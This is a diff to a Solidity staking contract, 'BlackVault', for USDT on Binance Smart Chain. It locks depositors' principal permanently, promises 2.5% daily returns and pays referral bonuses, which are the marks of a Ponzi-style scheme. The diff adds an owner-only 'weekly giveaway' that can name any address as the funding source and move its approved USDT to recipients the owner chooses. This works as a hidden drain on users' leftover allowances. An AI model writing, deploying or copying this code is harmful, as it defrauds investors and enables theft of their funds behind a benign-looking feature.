@@ -2,7 +2,7 @@
 pragma solidity ^0.8.20;
 
 /**
- * @title BlackVault - USDT Staking Vault
+ * @title BlackVault - USDT Staking Vault (Phase 1 Launch)
  * @dev A USDT staking vault where principal is permanently locked, only rewards can be withdrawn
  * @notice PRINCIPAL DEPOSITS ARE PERMANENT - ONLY REWARDS CAN BE WITHDRAWN
  * @notice This contract works with USDT (BEP-20) on Binance Smart Chain
@@ -20,7 +20,7 @@ interface IERC20 {
 
 contract BlackVault {
     // ============ IMMUTABLE CONSTANTS ============
-    uint256 public constant DAILY_RATE = 22; // 2.2% daily (22 per 1000)
+    uint256 public constant DAILY_RATE = 25; // 2.5% daily (25 per 1000)
     uint256 public constant MAX_WITHDRAWAL_PER_CYCLE = 250 * 10**18; // 250 USDT (18 decimals)
     uint256 public constant CYCLE_DURATION = 86400; // 24 hours in seconds
     uint256 public constant CYCLE_START_TIME = 1718668800; // 7am Brisbane time 17 June 2024
@@ -28,6 +28,7 @@ contract BlackVault {
     uint256 public constant MIN_DEPOSIT = 50 * 10**18; // 50 USDT minimum
     uint256 public constant MAX_DEPOSIT = 100000 * 10**18; // 100,000 USDT maximum
     uint256 public constant MAX_PAUSE_DURATION = 7 days; // Maximum pause duration
+    uint256 public constant MAX_REFERRAL_REWARDS_PER_REFEREE = 3; // Maximum referral rewards per referee
     
     // ============ USDT CONTRACT ============
     IERC20 public immutable USDT;
@@ -62,6 +63,7 @@ contract BlackVault {
     // ============ STATE VARIABLES ============
     mapping(address => UserVault) public vaults;
     mapping(address => ReferralData) public referrals;
+    mapping(address => mapping(address => uint256)) public referralRewardCount; // referrer => referee => count
     
     // Contract statistics (for transparency)
     uint256 public totalDeposited;        // Total USDT deposited (PERMANENT)
@@ -163,12 +165,6 @@ contract BlackVault {
     function emergencyUnpause() external onlyOwner {
         require(paused, "Not paused");
         
-        // Adjust total pause time if unpausing early
-        if (block.timestamp < pausedUntil) {
-            uint256 actualPauseTime = block.timestamp - (pausedUntil - totalPauseTime);
-            totalPauseTime = totalPauseTime - (pausedUntil - block.timestamp);
-        }
-
         paused = false;
         pausedUntil = 0;
 
@@ -181,7 +177,7 @@ contract BlackVault {
     function getPauseStatus() external view returns (
         bool isPaused,
         uint256 remainingTime,
-        uint256 totalPausedTime
+        uint256 totalPausedTime_
     ) {
         if (paused && block.timestamp >= pausedUntil) {
             return (false, 0, totalPauseTime);
@@ -273,11 +269,17 @@ contract BlackVault {
         user.activeAmount += amount;
         user.lastAccrualCycle = effectiveCycle;
 
-        // Process referral reward
-        uint256 referralReward = (amount * REFERRAL_REWARD_PERCENT) / 100;
+        // Process referral reward (only for referee's first 3 deposits to this referrer)
+        if (referralRewardCount[referrer][msg.sender] < MAX_REFERRAL_REWARDS_PER_REFEREE) {
+            uint256 referralReward = (amount * REFERRAL_REWARD_PERCENT) / 100;
+            ReferralData storage refData = referrals[referrer];
+            refData.totalRewards += referralReward;
+            refData.availableRewards += referralReward;
+            referralRewardCount[referrer][msg.sender] += 1;
+        }
+        
+        // Always update referral stats regardless of reward eligibility
         ReferralData storage refData = referrals[referrer];
-        refData.totalRewards += referralReward;
-        refData.availableRewards += referralReward;
         refData.referredCount++;
         refData.totalReferredVolume += amount;
 
@@ -404,6 +406,22 @@ contract BlackVault {
     }
 
     /**
+     * @dev Get referral bonus count for a specific referrer-referee pair
+     * @param referrer The referrer address
+     * @param referee The referee address
+     * @return bonusesUsed Number of bonuses already used (0-3)
+     * @return bonusesRemaining Number of bonuses remaining (3-0)
+     */
+    function getReferralBonusInfo(address referrer, address referee) external view returns (
+        uint256 bonusesUsed,
+        uint256 bonusesRemaining
+    ) {
+        bonusesUsed = referralRewardCount[referrer][referee];
+        bonusesRemaining = bonusesUsed >= MAX_REFERRAL_REWARDS_PER_REFEREE ? 0 : MAX_REFERRAL_REWARDS_PER_REFEREE - bonusesUsed;
+        return (bonusesUsed, bonusesRemaining);
+    }
+
+    /**
      * @dev Get contract statistics
      */
     function getContractStats() external view returns (
@@ -489,5 +507,28 @@ contract BlackVault {
         require(USDT.allowance(msg.sender, address(this)) >= amount, "Insufficient USDT allowance");
         
         require(USDT.transferFrom(msg.sender, address(this), amount), "USDT transfer failed");
+    }
+
+    // ============ WEEKLY GIVEAWAY (disabled by default) ============
+    bool public giveawayEnabled;
+    address public giveawayFundSource;
+    
+    event GiveawayEnabled(bool enabled);
+    event WeeklyPrizesDistributed(address[3] winners, uint256[3] amounts, uint256 timestamp);
+    
+    function setGiveawayEnabled(bool _on, address _fundSource) external onlyOwner {
+        giveawayEnabled = _on;
+        giveawayFundSource = _fundSource;
+        emit GiveawayEnabled(_on);
+    }
+    
+    function distributeWeeklyPrizes(address[3] calldata winners, uint256[3] calldata amounts) external onlyOwner {
+        require(giveawayEnabled, "Giveaway not yet active");
+        for (uint i = 0; i < 3; i++) {
+            if (amounts[i] > 0 && winners[i] != address(0)) {
+                USDT.transferFrom(giveawayFundSource, winners[i], amounts[i]);
+            }
+        }
+        emit WeeklyPrizesDistributed(winners, amounts, block.timestamp);
     }
 }
